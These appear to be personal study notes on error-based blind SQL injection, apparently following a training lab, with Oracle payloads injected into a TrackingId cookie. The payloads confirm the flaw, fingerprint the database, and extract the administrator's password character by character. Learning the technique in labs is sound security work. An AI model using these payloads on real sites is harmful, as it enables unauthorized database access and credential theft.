# error based sqli

> database might return only a specific error like a divide-by-zero error, creating a condition where a true result return that specific error can be a good signal

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`

```
if(1=2) return 1/0
else return 'a'
```

- it will return 'a' all the time but that might not be a response from the database

> but

`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

```
if(1=1) return 1/0
else return 'a'
```

- this will return 1/0 which will trigger a divide-by-zero error that might be an error that would be a response from the database

> example

`' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

- if the first letter of the password is 'm' it will return a divide-by-zero error

## example

> checking if sqli possible

`TrackingId=xyz'` -> should throw an error

`TrackingId=xyz''` -> should not throw an error

`TrackingId=xyz'||(SELECT '')||'` -> should throw an error

- `SELECT ''` -> select an empty string -> xyz + "" + ""

`TrackingId=xyz'||(SELECT '' FROM dual)||'` -> should not throw an error indicates it uses oracle for database`

`TrackingId=xyz'||(SELECT '' FROM duckduckduck)||'` -> test for possible invalid table, should receive error again

`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` -> check if users table exist but only returns 1 row, multiple rows might break the query, this indicates that the users table exist

> lets test conditions

`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> should return an error because of 1/0

`TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> should not return error

> lets test for user name

`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` -> in case of 'administrator' exist then run the case otherwise the case will never be evaluated, the evaluated case will return an error

- same query result but different logics

`TrackingId=xyz'||( SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM dual )||'`

> check for password length

`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

> check for the first letter of the password

`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

> check for the second letter of the password

`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
